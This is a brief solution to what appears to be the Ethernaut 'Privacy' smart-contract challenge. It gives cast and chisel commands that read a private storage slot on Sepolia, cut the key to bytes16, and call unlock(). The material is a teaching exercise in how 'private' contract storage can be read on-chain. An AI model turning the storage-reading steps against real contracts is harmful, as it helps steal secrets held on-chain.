# Privacy Solution

1) Retrieve the `key32`:

```
cast storage `ìnstanceAddress` 0x5 --rpc-url $SEPOLIA_RPC_URL
```

2) Cast the `key32` to `bytes16`:

```
chisel
bytes32 key32 = `key32`
bytes16 key16 = bytes16(key32)
key16
# truncate the last 32 zeros from `key16`
```

3) Call `unlock()`:

```
cast send `ìnstanceAddress` "unlock(bytes16)" `key16` --rpc-url $SEPOLIA_RPC_URL --account sepoliaKey
```
